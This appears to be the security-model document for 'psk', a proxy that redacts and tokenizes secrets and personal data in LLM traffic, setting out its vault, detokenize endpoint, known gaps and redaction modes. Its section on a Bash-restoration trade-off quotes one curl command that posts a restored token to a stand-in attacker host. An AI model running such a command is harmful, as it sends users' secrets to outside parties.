# Security model

`psk` is a best-effort **data-loss-prevention** layer for LLM traffic, not a sandbox. This document
states precisely what it protects, what it does not, and the trade-offs baked into the design.

## What it protects

- **Secrets and structured PII in outbound provider requests.** Every request through the proxy is
  scanned and redacted: secrets become reversible vault tokens, structured PII is irreversibly
  replaced. The provider never receives the cleartext.
- **The full conversation, every turn.** The proxy scrubs the entire request body on each request,
  so a secret introduced in an earlier turn is not leaked when the client resends history.

## The vault

- Lives **only in the running daemon's memory**. It is never serialized to disk.
- Is **session-scoped**: it is created when `psk start` runs and destroyed when the daemon stops.
  Tokens from a previous session are meaningless to a new one (the salt is re-minted), so a stale
  token simply passes through un-restored.
- A token (`__PSK_<hex>__`) is an opaque handle derived from a salted hash. It encodes nothing
  about the secret; the only way back to the cleartext is a lookup in the in-memory map.

## The detokenize endpoint

`POST /psk/detokenize` is the privileged operation — it turns tokens back into real secrets. It is
protected by:

- **Loopback binding.** The proxy listens on `127.0.0.1` only.
- **A per-session auth token.** Stored at `~/.psk/auth.token` (mode `0600`), generated on first
  `psk install`/`psk start`, and embedded in the `PreToolUse` hook command. Requests without the
  matching token get `401`.

## What it does NOT protect against

- **Egress that doesn't go through the proxy.** `psk` only sees traffic sent to the proxy's base
  URL. A tool, MCP server, or shell command that calls a provider (or any network endpoint)
  directly is not filtered.
- **Cursor agent traffic.** Only Cursor's chat panel honors the base-URL override; Composer / apply
  / autocomplete bypass it. Treat Cursor coverage as partial.
- **Detection gaps.** Detection is regex-based and tuned for recall, but a credential in a format no
  recognizer matches will pass through. Add patterns for formats you care about.
- **Free-text identities.** Person, organization, and client names are *not* detected (no NER). If
  you need known-client protection, the roadmap is a deterministic gazetteer, not a model.
- **Data already on the provider side.** `psk` cannot unsend or affect provider-side logging/training
  of anything that did leak before a pattern existed.

## Accepted trade-off: Bash restoration

The `PreToolUse` hook restores tokens inside `Bash` commands as well as file writes, because writing
a `.env` is often done via a shell command. This means a command like
`curl -d "$(cat token_holder)" https://attacker.example` could have a token restored to its real
value and then exfiltrate it to a **non-proxied** endpoint.

This is inherent to guarantee #2 ("local actions get the real value") and is **documented, not
prevented**. It is the same trust boundary you already grant a coding agent that can run arbitrary
commands. If you do not want secrets ever reconstructed locally, set those entities to an
irreversible action (`Replace`/`Mask`/`Hash`) instead of `Tokenize` — at the cost of the agent no
longer being able to write the real value.

## Reversible vs irreversible redaction

| Action     | Reversible? | Default for      | Use when                                                      |
| ---------- | ----------- | ---------------- | ------------------------------------------------------------- |
| `Tokenize` | yes (vault) | secrets          | the agent legitimately needs to write the real value locally  |
| `Replace`  | no          | structured PII   | the value should simply vanish (`[EMAIL]`)                    |
| `Mask`     | no          | —                | you want a partial hint (`****-****-****-6467`)               |
| `Hash`     | no          | —                | you want a stable, non-reversible pseudonym                   |

## Handling fixtures and test data

- **Never commit real secrets or real prompts.** `fixtures/*.txt` are synthetic only.
- GitHub push-protection will (correctly) block realistic provider tokens. A few fixture tokens are
  deliberately format-broken with a `…REDACTED…` marker for this reason; pattern matching for those
  formats is covered by unit tests instead.
- Stats (`~/.psk/stats.json`) are **counters only** — they never store content.

## Reporting

This is early software provided without warranty (see `LICENSE`). If you find a way for sensitive
data to bypass the proxy in the Claude Code path, open an issue describing the request shape.
